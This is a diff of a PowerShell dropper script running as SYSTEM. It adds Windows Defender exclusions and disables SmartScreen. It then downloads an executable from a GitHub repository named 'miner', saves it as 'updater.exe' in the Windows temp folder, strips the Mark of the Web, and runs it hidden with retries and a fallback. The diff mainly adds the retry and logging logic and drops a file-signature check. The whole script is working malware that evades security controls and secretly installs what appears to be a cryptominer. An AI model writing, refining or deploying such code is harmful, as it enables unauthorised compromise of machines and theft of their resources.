@@ -13,10 +13,10 @@ if (-not (Test-Path $logDirectory)) {
     New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
 }
 
-# --- NEW ADDITION: Ensure ServicesPipeTimeout is set for reliable service startup ---
+# --- Ensure ServicesPipeTimeout is set for reliable service startup ---
 $servicesPipeTimeoutPath = "HKLM:\SYSTEM\CurrentControlSet\Control"
 $servicesPipeTimeoutName = "ServicesPipeTimeout"
-$desiredTimeoutMs = 120000 # 120 seconds (2 minutes) - adjust as needed
+$desiredTimeoutMs = 120000 # 120 seconds (2 minutes)
 
 Add-Content -Path $logPath -Value "Checking and setting ServicesPipeTimeout in registry..."
 
@@ -24,18 +24,17 @@ try {
     $currentTimeout = Get-ItemProperty -Path $servicesPipeTimeoutPath -Name $servicesPipeTimeoutName -ErrorAction SilentlyContinue
     if (-not $currentTimeout -or $currentTimeout.$servicesPipeTimeoutName -lt $desiredTimeoutMs) {
         Set-ItemProperty -Path $servicesPipeTimeoutPath -Name $servicesPipeTimeoutName -Value $desiredTimeoutMs -Force -ErrorAction Stop
-        Add-Content -Path $logPath -Value "ServicesPipeTimeout set to ${desiredTimeoutMs}ms. A reboot is required for this change to fully take effect for service startups."
+        Add-Content -Path $logPath -Value "ServicesPipeTimeout set to ${desiredTimeoutMs}ms. A reboot is required for this change to fully take effect."
     } else {
         Add-Content -Path $logPath -Value "ServicesPipeTimeout is already set to $($currentTimeout.$servicesPipeTimeoutName)ms (or higher than desired ${desiredTimeoutMs}ms)."
     }
 } catch {
     Add-Content -Path $logPath -Value "Error setting ServicesPipeTimeout: $_"
 }
-# --- END NEW ADDITION ---
 
 Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account."
 
-# --- Optional: Verify Admin Status (for logging/debugging) ---
+# --- Verify Admin Status ---
 function Is-Admin {
     $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
     $principal = New-Object Security.Principal.WindowsPrincipal($identity)
@@ -44,40 +43,31 @@ function Is-Admin {
 if (Is-Admin) {
     Add-Content -Path $logPath -Value "Confirmed: Script is running with Administrator (SYSTEM) privileges."
 } else {
-    Add-Content -Path $logPath -Value "WARNING: Script is NOT running with Administrator privileges. Commands might fail."
-    # This block should ideally not be hit if UpdaterSrv runs as LocalSystem.
+    Add-Content -Path $logPath -Value "WARNING: Script is NOT running with Administrator privileges."
 }
 
-# --- START: Adaptive Wait for Windows Defender Service to be ready ---
-Add-Content -Path $logPath -Value "Waiting for Windows Defender service to be fully ready before adding exclusions..."
-$maxAttempts = 20 # Check up to 20 times (20 * 5 seconds = 100 seconds max wait)
-$delayBetweenChecks = 5 # seconds between each check
+# --- Adaptive Wait for Windows Defender ---
+Add-Content -Path $logPath -Value "Waiting for Windows Defender service to be fully ready..."
+$maxAttempts = 20
+$delayBetweenChecks = 5
 
 for ($i = 0; $i -lt $maxAttempts; $i++) {
     try {
-        # Check if the WinDefend service is running and Real-time Protection is enabled
         $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
         $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
-
         if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
             Add-Content -Path $logPath -Value "Windows Defender service is running and Real-time Protection is enabled."
-            break # Exit loop if Defender is ready
+            break
         }
     } catch {
-        # Catch errors if service isn't found or Get-MpComputerStatus fails
         Add-Content -Path $logPath -Value "Attempt $($i+1): Defender service not yet found or ready. Error: $_. Waiting..."
     }
-    
-    # If not ready, wait and try again
     Start-Sleep -Seconds $delayBetweenChecks
-
     if ($i -eq ($maxAttempts - 1)) {
-        # This is the last attempt, log a warning if still not ready
-        Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be fully ready. Proceeding with exclusions anyway."
+        Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be fully ready. Proceeding with exclusions."
     }
 }
 Add-Content -Path $logPath -Value "Finished adaptive wait. Proceeding with Defender exclusions."
-# --- END: Adaptive Wait ---
 
 # --- Add Windows Defender Exclusions ---
 Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."
@@ -91,19 +81,13 @@ $exclusions = @(
 foreach ($excl in $exclusions) {
     try {
         $currentExclusions = Get-MpPreference
-        
-        # Check if exclusion path already exists
         $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
-        # Check if exclusion process already exists
         $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
-        
-        # Check for extension if applicable (e.g., for ".exe")
         $ext = [System.IO.Path]::GetExtension($excl).TrimStart(".")
         $extensionExists = $false
         if ($ext) {
             $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $ext }) -ne $null
         }
-
         if (-not ($pathExists -or $processExists -or ($ext -and $extensionExists))) {
             Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
             Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
@@ -121,23 +105,22 @@ foreach ($excl in $exclusions) {
 Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."
 
 # --- Fetch and Execute Payload ---
-$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe" # <-- IMPORTANT: REPLACE WITH YOUR GITHUB RELEASE DIRECT LINK
+$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe" # GitHub direct link
 $payloadPath = "C:\Windows\Temp\updater.exe"
 
 Add-Content -Path $logPath -Value "Attempting to disable SmartScreen, fetch, and execute .exe payload from $payloadUrl."
 
 try {
-    # Disable SmartScreen via registry
+    # Disable SmartScreen
     $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
     try {
         Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
         Add-Content -Path $logPath -Value "SmartScreen disabled successfully."
     } catch {
         Add-Content -Path $logPath -Value "Failed to disable SmartScreen: $_"
-        # Continue execution, as SmartScreen may already be disabled or restricted by Group Policy
     }
 
-    # Verify SmartScreen status for logging
+    # Verify SmartScreen status
     $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
     if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
         Add-Content -Path $logPath -Value "Confirmed: SmartScreen is disabled."
@@ -145,29 +128,44 @@ try {
         Add-Content -Path $logPath -Value "SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
     }
 
+    # Log execution environment
+    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+    Add-Content -Path $logPath -Value "Execution context: User=$($currentUser.Name), SID=$($currentUser.User.Value)"
+
     # Ensure payload directory exists
     if (-not (Test-Path (Split-Path $payloadPath -Parent))) {
         New-Item -ItemType Directory -Path (Split-Path $payloadPath -Parent) -Force | Out-Null
         Add-Content -Path $logPath -Value "Created payload directory: $(Split-Path $payloadPath -Parent)."
     }
 
-    # Download the .exe payload using Invoke-WebRequest
+    # Download the .exe payload
     Add-Content -Path $logPath -Value "Downloading .exe payload from $payloadUrl using Invoke-WebRequest..."
     $webResponse = Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -PassThru
     Add-Content -Path $logPath -Value "EXE payload downloaded to $payloadPath. Content-Type: $($webResponse.Headers['Content-Type'])"
 
-    # Log downloaded file size for reference
+    # Log downloaded file size
     $downloadedSize = (Get-Item $payloadPath).Length
     Add-Content -Path $logPath -Value "Downloaded file size: $downloadedSize bytes."
 
-    # Verify file is an executable (check for MZ header)
-    $fileBytes = Get-Content $payloadPath -Raw -Encoding Byte -ReadCount 0 | Select-Object -First 2
-    if ($fileBytes -notlike @(77, 90)) { # MZ signature for .exe
-        throw "Downloaded file is not a valid executable (invalid MZ signature)."
-    }
-    Add-Content -Path $logPath -Value "Downloaded file appears to be a valid executable (MZ signature verified)."
+    # Log file attributes
+    $fileAttributes = (Get-Item $payloadPath).Attributes
+    Add-Content -Path $logPath -Value "File attributes: $fileAttributes"
 
-    # Remove Mark of the Web to further reduce SmartScreen triggers
+    # Check file extension
+    if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
+        Add-Content -Path $logPath -Value "Warning: Downloaded file does not have .exe extension."
+    }
+
+    # Log first 16 bytes for debugging
+    try {
+        $fileBytes = Get-Content $payloadPath -Raw -Encoding Byte -ReadCount 0 | Select-Object -First 16
+        $hexBytes = $fileBytes | ForEach-Object { $_.ToString("X2") } | Join-String -Separator " "
+        Add-Content -Path $logPath -Value "First 16 bytes of file (hex): $hexBytes"
+    } catch {
+        Add-Content -Path $logPath -Value "Failed to read file bytes: $_"
+    }
+
+    # Remove Mark of the Web
     try {
         Unblock-File -Path $payloadPath -ErrorAction Stop
         Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
@@ -175,24 +173,52 @@ try {
         Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
     }
 
-    # Execute the .exe silently
+    # Check for file access before execution
     try {
-        Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
-        Add-Content -Path $logPath -Value "Payload executed successfully using Start-Process."
+        $file = [System.IO.File]::Open($payloadPath, 'Open', 'Read', 'None')
+        $file.Close()
+        Add-Content -Path $logPath -Value "File is accessible for execution."
     } catch {
-        Add-Content -Path $logPath -Value "Start-Process execution failed: $_"
-        # Fallback: Try direct invocation
+        Add-Content -Path $logPath -Value "File access check failed: $_"
+        throw "Cannot access file for execution."
+    }
+
+    # Execute the .exe with up to 3 attempts
+    $maxAttempts = 3
+    $retryDelay = 10 # Seconds between attempts
+    $success = $false
+
+    for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
         try {
+            Add-Content -Path $logPath -Value "Attempting to execute payload (Attempt $attempt of $maxAttempts)..."
+            Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
+            Add-Content -Path $logPath -Value "Payload executed successfully on attempt $attempt."
+            $success = $true
+            break
+        } catch {
+            Add-Content -Path $logPath -Value "Execution failed on attempt $attempt: $_"
+            if ($attempt -lt $maxAttempts) {
+                Add-Content -Path $logPath -Value "Waiting $retryDelay seconds before retrying..."
+                Start-Sleep -Seconds $retryDelay
+            }
+        }
+    }
+
+    # Fallback: Try direct invocation
+    if (-not $success) {
+        try {
+            Add-Content -Path $logPath -Value "Attempting fallback direct invocation..."
             & $payloadPath
             Add-Content -Path $logPath -Value "Payload executed successfully using direct invocation."
+            $success = $true
         } catch {
-            Add-Content -Path $logPath -Value "Direct invocation failed: $_"
-            throw "Failed to execute payload using all methods."
+            Add-Content -Path $logPath -Value "Fallback direct invocation failed: $_"
+            throw "Failed to execute payload after $maxAttempts attempts and fallback invocation."
         }
     }
 
 } catch {
-    Add-Content -Path $logPath -Value "Failed to disable SmartScreen, fetch, or execute payload from $payloadUrl. Error: $_"
+    Add-Content -Path $logPath -Value "Failed to fetch or execute payload from $payloadUrl. Error: $_"
 }
 
 Add-Content -Path $logPath -Value "Script execution finished at $(Get-Date)."
